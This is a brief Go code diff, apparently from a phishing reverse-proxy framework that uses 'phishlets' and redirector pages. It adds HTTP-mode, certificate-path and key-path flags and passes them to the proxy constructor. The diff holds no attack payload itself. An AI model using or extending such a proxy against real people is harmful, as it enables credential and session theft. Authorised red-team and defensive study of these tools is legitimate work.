@@ -20,6 +20,11 @@ import (
 
 var phishlets_dir = flag.String("p", "", "Phishlets directory path")
 var redirectors_dir = flag.String("t", "", "HTML redirector pages directory path")
+
+var http = flag.Bool("http", false, "Enable HTTP server")
+var cert_file = flag.String("cert", "", "Path to certificate file")
+var key_file = flag.String("key", "", "Path to private key file")
+
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
@@ -170,7 +175,7 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy(cfg.GetServerBindIP(), cfg.GetHttpsPort(), cfg, crt_db, db, bl, *developer_mode, *http, *cert_file, *key_file)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
